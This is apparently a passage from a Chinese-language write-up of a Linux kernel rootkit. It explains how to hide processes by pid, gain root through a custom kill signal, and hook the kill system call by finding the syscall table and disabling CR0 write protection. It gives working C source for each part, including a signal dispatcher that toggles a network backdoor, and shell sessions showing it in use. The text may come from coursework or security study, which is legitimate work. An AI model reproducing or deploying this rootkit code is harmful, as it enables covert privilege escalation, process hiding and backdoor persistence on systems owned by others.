### 3.根据pid指定需要隐藏的进程

通过kill调用 hook kill调用，如果是定义的特定信号，添加目标pid到需要屏蔽的pid链表

#### 使用
1. 打开一个test文件。使用命令`ps aux |grep test`查看test进程pid，pid为14114。


	```
	challenge@ubuntu:~$ ps aux |grep test
	challen+ 14114  1.7  3.5 662556 36088 ?        Sl   21:08   0:00 gedit /home/challenge/Desktop/test
	challen+ 14165  0.0  0.1  21292  1016 pts/17   R+   21:08   0:00 grep --color=auto test

	```	



2. 隐藏test进程。使用命令`kill -49 14114`，其中49是自定义的信号用于根据pid隐藏进程

	```
	challenge@ubuntu:~$ kill -49 14114
	challenge@ubuntu:~$ ps aux |grep test
	challen+ 16274  0.0  0.0  21292   980 pts/17   S+   21:20   0:00 grep --color=auto test
	```


3. 取消隐藏test进程。再次执行`kill -49 14114`

	```
	challenge@ubuntu:~$ kill -49 14114
	challenge@ubuntu:~$ ps aux |grep test
	challen+ 14114  0.0  3.6 662556 36136 ?        Sl   21:08   0:00 gedit /home/challenge/Desktop/test
	root     20315  0.0  0.0  21292   976 pts/17   S+   21:42   0:00 grep --color=auto test
	
	```


#### 实现

创建双向链表用来保存目前隐藏的进程的pid，当执行命令`kill -49 pid`时，有隐藏和取消隐藏两种情况。首先判断该pid是否在表中，如果不在，则说明当前此pid未被隐藏，进而执行隐藏操作，在链表中添加该pid；否则执行取消隐藏操作，在链表中添加该pid。

```c
case SIGHIDEPROC:
        if (is_pid_hidden((long)pid))
            make_pid_show((long)pid);
        else
            make_pid_hidden((long)pid);
        break;
```

```c
void make_pid_hidden(long pid)
{
    struct pid_list *new_pid = NULL;

    if (is_pid_hidden(pid))
        return;

    new_pid = kmalloc(sizeof(struct pid_list), GFP_KERNEL);
    if (new_pid == NULL)
        return;

    new_pid->next = first_pid;
    new_pid->prev = NULL;
    new_pid->pid = pid;
    if (first_pid != NULL)
        first_pid->prev = new_pid;
    first_pid = new_pid;
}

void make_pid_show(long pid)
{
    struct pid_list *i_ptr = first_pid;
    while (i_ptr)
    {
        if (i_ptr->pid == pid)
        {
            if (i_ptr->prev)
                i_ptr->prev->next = i_ptr->next;
            else
                first_pid = i_ptr->next;
            if (i_ptr->next)
                i_ptr->next->prev = i_ptr->prev;
            kfree(i_ptr);
            return;
        }
        i_ptr = i_ptr->next;
    }
    return;
}
```


### 10.获得root权限
通过kill调用获得root权限， hook kill调用，特定信号将目前进程权限改为root

#### 使用
1. 查看当前用户。命令`whoami`
    
	```
	challenge@ubuntu:~/Desktop/hymmm$ whoami
	challenge
	```


2. 获得root权限。命令`kill -48 3`，其中48是自定义的信号用于提升root权限，3无意义可以是任意的值。

	```
	challenge@ubuntu:~/Desktop/hymmm$ kill -48 3
	challenge@ubuntu:~/Desktop/hymmm$ whoami
	root
	```
	

#### 实现

```c
#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 29)
        current->uid = 0;
        current->suid = 0;
        current->euid = 0;
        current->gid = 0;
        current->egid = 0;
        current->fsuid = 0;
        current->fsgid = 0;
        cap_set_full(current->cap_effective);
        cap_set_full(current->cap_inheritable);
        cap_set_full(current->cap_permitted);
#else
        //这个函数分配并应用了一个新的凭证结构（uid = 0, gid = 0）从而获取root权限。
        commit_creds(prepare_kernel_cred(0));
#endif
```



### 11.自定义kill中的信号
hook kill调用函数，并在新的函数中添加自定义的信号，以实现rootkit行为控制。

#### 实现

1. 读取系统调用表
	
	```c
	//通过对close函数的标记查找
	static unsigned long **acquire_sys_call_table(void)
	{
	    unsigned long int offset = (unsigned long int)sys_close;
	    unsigned long **sct;
	
	    if (DEBUG)
	        printk(KERN_INFO "finding syscall table from: %p\n", (void *)offset);
	
	    while (offset < ULLONG_MAX)
	    {
	        sct = (unsigned long **)offset;
	
	        if (sct[__NR_close] == (unsigned long *)sys_close)
	        {
	            if (DEBUG)
	                printk(KERN_INFO "sys call table found: %p\n", (void *)sct);
	            return sct;
	        }
	        offset += sizeof(void *);
	    }
	
	    return NULL;
	}
	```

2. 打开对系统调用表的写权限，并对系统调用表中的__NR_kill项进行修改。首先将原来系统调用表中存放 __NR_kill 的地址保存到 ref_sys_kill，然后将自定义的 new_sys_kill 函数的地址写到系统调用表中 __NR_kill 对应的位置。这样，便实现了对 kill 的 hook。如下图所示。修改完之后再还原对系统调用表的写保护。
	
	```c
	#if SYSCALL_MODIFY_METHOD == CR0
	    original_cr0 = read_cr0();
	    write_cr0(original_cr0 & ~0x00010000);
	#endif
	#if SYSCALL_MODIFY_METHOD == PAGE_RW
	    make_rw((long unsigned int)sys_call_table_);
	#endif
	```
	```c
	#define register(name)                                     \
	    ref_sys_##name = (void *)sys_call_table_[__NR_##name]; \
	    sys_call_table_[__NR_##name] = (unsigned long *)new_sys_##name;
	
	register(kill);
	```
	```c
	#if SYSCALL_MODIFY_METHOD == CR0
	    write_cr0(original_cr0);
	#endif
	#if SYSCALL_MODIFY_METHOD == PAGE_RW
	    make_ro((long unsigned int)sys_call_table_);
	#endif
	```
	![9d2920692ac99ba749f13a8b28d3c23b.png](/Users/challenge/Desktop/hook.png)
	
3. 自定义的new_sys_kill函数的实现。
	
	新定义了六个未用的信号48-53。这些用来实现rootkit想要的功能，如48实现提升权限，49实现通过pid隐藏进程等等。
	
	```c
	#define SIGROOT 48
	#define SIGHIDEPROC 49
	#define SIGHIDEHYMMNOS 50
	#define SIGHIDECONTENT 51
	#define SIGBACKDOOR 52
	#define SIGKOMON 53
	```
	
	```c
	asmlinkage int new_sys_kill(pid_t pid, int sig)
	{
	    switch (sig)
	    {
	    case SIGHIDEHYMMNOS:
	        if (hidden)
	            show();
	        else
	            hide();
	        break;
	    case SIGHIDEPROC:
	        if (is_pid_hidden((long)pid))
	            make_pid_show((long)pid);
	        else
	            make_pid_hidden((long)pid);
	        break;
	    case SIGHIDECONTENT:
	        if (hide_file_content)
	            hide_file_content = 0;
	        else
	            hide_file_content = 1;
	        break;
	    case SIGROOT:
	        #if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 29)
	                current->uid = 0;
	                current->suid = 0;
	                current->euid = 0;
	                current->gid = 0;
	                current->egid = 0;
	                current->fsuid = 0;
	                current->fsgid = 0;
	                cap_set_full(current->cap_effective);
	                cap_set_full(current->cap_inheritable);
	                cap_set_full(current->cap_permitted);
	        #else
	                commit_creds(prepare_kernel_cred(0));
	        #endif
	        break;
	    case SIGBACKDOOR:
	        if (is_net_backdoor)
	            unregist_backdoor();
	        else
	            regist_backdoor();
	        break;
	    case SIGKOMON:
	        if (is_komon)
	            unregist_komon();
	        else
	            regist_komon();
	        break;
	    default:
	        return ref_sys_kill(pid, sig);
	    }
	    return 0;
	}
	```
